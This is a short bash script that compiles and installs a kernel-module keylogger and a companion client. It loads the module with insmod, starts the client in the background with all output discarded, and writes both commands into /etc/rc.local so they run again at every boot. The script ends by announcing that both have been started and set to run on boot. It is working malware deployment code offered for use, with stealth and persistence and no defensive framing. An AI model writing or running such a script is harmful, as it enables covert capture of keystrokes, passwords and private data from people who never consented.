
#!/bin/bash
PROJECT_DIR=$(dirname "$(realpath "$0")")

#make
cd keylogger && make
cd ../
cd client && make
cd ../

sudo insmod keylogger/keylogger.ko


nohup ./client/client_main &> /dev/null &

sudo bash -c "echo 'insmod $PROJECT_DIR/keylogger/keylogger.ko' >> /etc/rc.local"
sudo bash -c "echo 'nohup $PROJECT_DIR/client/client_main &> /dev/null &' >> /etc/rc.local"

echo "Keylogger and client have been started and set to run on boot."
